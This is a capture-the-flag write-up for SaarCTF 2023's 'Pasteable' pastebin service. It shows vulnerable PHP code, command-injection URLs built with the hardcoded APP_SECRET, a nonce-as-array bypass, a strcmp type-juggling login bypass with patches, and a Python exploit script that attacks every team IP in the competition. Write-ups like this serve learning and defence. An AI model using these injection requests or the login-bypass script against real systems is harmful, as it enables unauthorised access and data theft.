---
layout: post
title:  "Pasteable - A/D Web Service"
date:   2023-11-20 12:28:05 +0100
categories: writeups
--- 

```
Challenge: Pasteable
Authors: 0xMatte & Shotokhan
Description: Abusing hardcoded secrets and type juggling
CTF: SaarCTF 2023
Category: Web
```

The service listens on port 8080, and is run by a Nginx server. It is a pastebin, and uses a challenge-based authentication.

## Hardcoded secrets
One of the first things to note is the presence of hardcoded information used in multiple points throughout the service. This information is in `/func/config.php`:

```php
<?php

//=====================================================================
// variables and configuration:
//=====================================================================

// CIPHER CONFIGURATION
$CIPHER_SECRET = "0123456789ABCDEF";
$CIPHER_RING = "AES-128-CTR";

// APP CONFIGURATION
$APP_SECRET = "0123456789ABCDEF";
$APP_HOST = "linux";
$APP_PATH = dirname(__FILE__)."/../";

// DB CONFIGURATION
$DB_HOST = null;
$DB_USER = "www-data";
$DB_PASS = null;
$DB_NAME = "pasteable";

$MYSQLI = new mysqli($DB_HOST, $DB_USER, $DB_PASS, $DB_NAME) or die($MYSQLI->error);
if ($MYSQLI->connect_errno)
    die("Failed to connect to MySQL: " . $MYSQLI->connect_error);

//=====================================================================

```

### Example impact: RCE
Failing to modify this configuration makes the service vulnerable in many points. For example, in `/func/ntp.php`, it's possible to trigger a RCE:

```php
<?php

// Network-Time-Protocol API

// variables and configs
require("../func/config.php");

// ensure that requester knows super-duper-secret
$additional_time_formatter = (isset($_GET['modifiers'])) ? $_GET['modifiers'] : "";
$caller_nonce = (isset($_GET['nonce'])) ? $_GET['nonce'] : "";
$caller_checksum = (isset($_GET['checksum'])) ? $_GET['checksum'] : "";

if(isset($_GET['modifiers'])) {
    $nonce_hash = hash_hmac('sha256', $caller_nonce, $APP_SECRET);
    $checksum = hash_hmac('sha256', $additional_time_formatter, $nonce_hash);

    // if the checksum is wrong, the requester is a bad guy who
    // doesn't know the secret
    if($checksum !== $caller_checksum) {
        die("ERROR: Checksum comparison has failed!");
    }
}
// print current time
$time_command = ($APP_HOST === 'win') ? "date /t && time /t" : "date";
$requested_time = `$time_command $additional_time_formatter`;
echo preg_replace('~[\r\n]+~', '', $requested_time);
```

The RCE can be triggered using the date modifiers; the hardcoded `APP_SECRET` can be used to generate the required checksum. For example, to inject `; echo lol`:

```
http://<team_ip>:8080/func/ntp.php?checksum=502bdde984cd38d2d55530f400e9d85803fca100e8fc5c5d76692f009d070e2c&modifiers=;%20echo%20lol
```

To inject a query to `mysql`, such as `; mysql -u www-data pasteable -e 'SELECT paste_id FROM user_pastes;'`

```
http://<team_ip>:8080/func/ntp.php?checksum=270553c4b387caa5f1845c5f5a49d36690dffe325907bab51541fd91d6fcaa88&modifiers=%3B%20mysql%20%2Du%20www%2Ddata%20pasteable%20%2De%20%27SELECT%20paste%5Fid%20FROM%20user%5Fpastes%3B%27
```

Anyway, the attack chain to get the actual flags from this is pretty complex, since pastebins are stored encrypted, and teams started to patch the hardcoded secrets after a few hours.

> Note: **there is another way to exploit this without knowing the `APP_SECRET`**: by passing the nonce as array, the `$nonce_hash` variable will be `NULL` and will not depend anymore upon the `APP_SECRET`, so the checksum will only depend upon the `$additional_time_formatter`. This exploit works in the PHP version installed on the vulnbox. To patch it, we must validate that the nonce is a string.

## Login bypass with type juggling
As previously said, the authentication is challenge-based. Anyway, it's possible to bypass it, thanks to PHP being a magic language. In fact, let's look at `/func/login.php`, only the relevant part:

```php
if(!isset($_POST['username']) || !isset($_POST['solution'])){
    header('HTTP/1.0 403 Forbidden');
    die("Invalid request");
}

if(!isset($_SESSION['challenge']) || !(strcmp($_POST['solution'], $_SESSION['challenge']) == 0)){
    header('HTTP/1.0 403 Forbidden');
    die("No valid challenge found");
}
```

By passing `$_POST['solution']` as an array, it's possible to make the call to `strcmp` return `NULL`, allowing the attacker to bypass the authentication without decrypting the challenge. In fact, `NULL` is equal to 0 if the comparison is loose (not strict).

### Patch
To patch it, we need to make sure that the `solution` parameter is a string, or by using a strict comparison:

1. Validating the type

```php
if(!isset($_POST['username']) || !isset($_POST['solution']) || !is_string($_POST['solution'])) {
    header('HTTP/1.0 403 Forbidden');
    die("Invalid request");
}
```

2. Using a strict comparison

```php
if(!isset($_SESSION['challenge']) || !(strcmp($_POST['solution'], $_SESSION['challenge']) === 0)){
    header('HTTP/1.0 403 Forbidden');
    die("No valid challenge found");
}
```

### Exploit
Here is the exploit script in Python, for `DestructiveFarm`, that we used during the A/D CTF:

```python
#!/usr/bin/env python3
from concurrent.futures import ThreadPoolExecutor
import requests


def get_flag(ip, usernames):
    try:
        for username in usernames:
            s = requests.Session()
            s.post(f'http://{ip}:8080/func/challenge.php', data={'username': username}, timeout=5)
            r = s.post(f'http://{ip}:8080/func/login.php', data={'username': username, 'solution[]': '0'}, timeout=5)

            if r.status_code == 200:
                print(s.get(f'http://{ip}:8080/admin/home/').text, flush=True)
    except KeyboardInterrupt:
        exit()
    except:
        pass


data = requests.get('https://scoreboard.ctf.saarland/attack.json').json()
# ids = {'IP': {'TICK_NUM': 'USERNAME'}} ; It only contains values for flags that are still valid.
ids = data['flag_ids']['Pasteable']

with ThreadPoolExecutor(max_workers=10) as p:
    for ip in ids.keys():
        usernames = ids[ip].values()
        p.submit(get_flag, ip, usernames)
    
```


